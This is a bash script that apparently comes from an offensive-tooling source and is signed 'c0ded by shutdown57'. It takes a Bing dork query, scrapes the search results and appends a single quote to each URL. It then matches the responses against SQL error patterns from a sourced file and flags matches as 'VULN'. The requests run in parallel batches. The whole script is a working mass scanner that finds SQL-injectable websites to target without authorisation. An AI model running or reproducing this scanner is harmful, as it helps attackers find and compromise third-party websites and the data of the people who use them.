#!/bin/bash
source detect-error-sqli.db



BingDorker()
{
	local curl=`curl "http://www.bing.com/search?q=${2}&first=${1}1" -s`
	local gets=$(echo $curl | grep -Po "(?<=<h2><a href=\")[^\"]*")
	for url in $gets
	do
		echo $url | grep "bing" > /dev/null
		if [[ $? -eq 0 ]]; then
			echo ""
		else
			sleep 1
			#echo -e "["$b" CHECK "$n"] ...................................."
			CekSQLi $url ${1} ${3}
		fi
	done
}
CekSQLi()
{

local cekErr=`curl -s "${1}'"`
echo "---------------------------" >> "log.txt"
echo "${1}" >> "log.txt"
echo "===========================" >> "log.txt"
echo  $cekErr >> "log.txt"
echo "===========================" >> "log.txt"
echo "c0ded by shutdown57        " >> "log.txt"
echo "---------------------------" >> "log.txt"
IFS="," read -r -a err <<< "${error[*]}"
#echo ${err[2]}
while [ "x${err[count]}" != "x" ]
do
   count=$(( $count + 1 ))
done
	#echo ${err[$i]}
	if [[   $cekErr =~ ${err[0]} ||
			$cekErr =~ ${err[1]} ||
			$cekErr =~ ${err[2]} ||
			$cekErr =~ ${err[3]} ||
			$cekErr =~ ${err[3]} ||
			$cekErr =~ ${err[4]} ||
			$cekErr =~ ${err[5]} || 
			$cekErr =~ ${err[6]} ||
			$cekErr =~ ${err[7]} ||
			$cekErr =~ ${err[8]} ||
			$cekErr =~ ${err[9]} ||
			$cekErr =~ ${err[10]} ||
			$cekErr =~ ${err[11]} ||
			$cekErr =~ ${err[12]} ||
			$cekErr =~ ${err[13]} ||
			$cekErr =~ ${err[14]} ||
			$cekErr =~ ${err[15]} ||
			$cekErr =~ ${err[16]} ||
			$cekErr =~ ${err[17]} ||
			$cekErr =~ ${err[18]} ||
			$cekErr =~ ${err[19]} ||
			$cekErr =~ ${err[20]} ||
			$cekErr =~ ${err[21]} ||
			$cekErr =~ ${err[22]} ]]; then
		Serror=1
	else
		Serror=0
	fi
if [[ $Serror == 1 ]]; then
	echo -e "[ ${2}/${3} | "$lh" VULN "$n"] : ${1} "
	save_output "${1}"
else
	echo -e "[ ${2}/${3} | "$lm" NOOT "$n"] : ${1} "
	
fi
}

__src_dorking_scan(){
read -p "BING DORK  >>" dork
read -p "MAX SEARCH >>" page
for (( i = 0; i <= $page ; i++ )); do
	((cthread=cthread%10)); ((cthread++==0)) && wait
	BingDorker $i $dork ${page} &
done
}